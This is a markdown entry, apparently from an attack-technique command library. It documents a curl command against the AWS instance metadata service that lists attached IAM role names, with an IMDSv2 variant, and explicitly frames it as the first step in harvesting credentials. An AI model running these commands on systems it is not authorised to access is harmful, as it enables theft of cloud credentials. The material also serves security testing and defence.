---
id: new-uuid-for-list-roles
name: curl-list-iam-roles
type: command
executor: bash
data: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'
output: null
created_at: '2023-04-06T03:56:13.577299+00:00'
updated_at: '2023-04-10T20:21:03.075046+00:00'
platforms:
  - AWS
  - Linux
tags:
  - cloud
  - aws
  - credential-access
verified: true
validated: true
---

# curl-list-iam-roles

## Command

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Description

This command queries the AWS Instance Metadata Service to list the names of IAM roles attached to the current EC2 instance. It is the first step in harvesting credentials, identifying which role to target for full credential retrieval.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | The endpoint is fixed; no parameters needed. For IMDSv2, add token header. | No |

## Examples

### Basic Usage

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### With IMDSv2 Token (if required)

```bash
token=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $token" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Expected Output

A plain text response listing role names, such as:
```
MyInstanceRole
AnotherRole
```
If no roles are attached, the response may be empty or an error.

## Related

- [[procedures/Harvest-AWS-IAM-Credentials-from-Instance-Metadata]]
- [[commands/curl-retrieve-iam-role-credentials]]
